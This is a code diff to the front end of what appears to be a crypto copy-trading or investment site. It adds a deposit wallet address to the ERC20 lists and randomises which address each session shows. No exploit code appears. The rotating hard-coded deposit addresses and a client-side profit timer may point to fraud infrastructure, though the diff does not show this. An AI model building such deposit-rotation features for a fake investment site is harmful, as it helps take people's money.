@@ -987,9 +987,9 @@ const COIN_LABELS = {
 };
 const WALLETS = {
   'BTC':['bc1q5q460ngh4dkdsxl4m4p2xw90uvc46lkvefqad3','bc1qrwqynkr6l2xy6zwz5dyra40dz25499up7venn9'],
-  'ETH_ERC20':['0x91E658396628b0144F9DCe431938D3259B5eCe52','0x78ec070a7454ac271e3a013bd291171436ebe377'],
-  'USDT_ERC20':['0x91E658396628b0144F9DCe431938D3259B5eCe52','0x78ec070a7454ac271e3a013bd291171436ebe377'],
-  'USDC_ERC20':['0x91E658396628b0144F9DCe431938D3259B5eCe52','0x0619c23bf4c0c41c4e606ef18a9548e88fb8e97c'],
+  'ETH_ERC20':['0x91E658396628b0144F9DCe431938D3259B5eCe52','0x78ec070a7454ac271e3a013bd291171436ebe377','0x0619c23bf4c0c41c4e606ef18a9548e88fb8e97c'],
+  'USDT_ERC20':['0x91E658396628b0144F9DCe431938D3259B5eCe52','0x78ec070a7454ac271e3a013bd291171436ebe377','0x0619c23bf4c0c41c4e606ef18a9548e88fb8e97c'],
+  'USDC_ERC20':['0x91E658396628b0144F9DCe431938D3259B5eCe52','0x78ec070a7454ac271e3a013bd291171436ebe377','0x0619c23bf4c0c41c4e606ef18a9548e88fb8e97c'],
   'SOL':['838C1Dkn9aPFFqyr4nM8q9stA3x2qcPsKRokfSRVFbJD','4jPt9jyRMVFfUs5hUPTkaKNdUmzhesugHfpX4SmC6tHn'],
   'USDC_TRC20':['TCcuwT7wmpz4TV8wsPGg3ABmdhATbfLPYu','TWT5mwFcmzaC9yiNTgUbLR2umE5MJwqzLC'],
   'USDT_TRC20':['TCcuwT7wmpz4TV8wsPGg3ABmdhATbfLPYu','TWT5mwFcmzaC9yiNTgUbLR2umE5MJwqzLC']
@@ -1021,7 +1021,8 @@ const TRADERS = [
 /* ═══════════ STATE ═══════════ */
 let token = localStorage.getItem('cvp_token');
 let user  = JSON.parse(localStorage.getItem('cvp_user') || '{}');
-let wIdx  = parseInt(localStorage.getItem('cvp_wi') || '0');
+// Random starting index per session so different users see different addresses
+let wIdx = Math.floor(Math.random() * 10);
 let selectedPlanId = null;
 let selectedTrader = JSON.parse(localStorage.getItem('cvp_selected_trader') || 'null');
 let profitInterval = null;
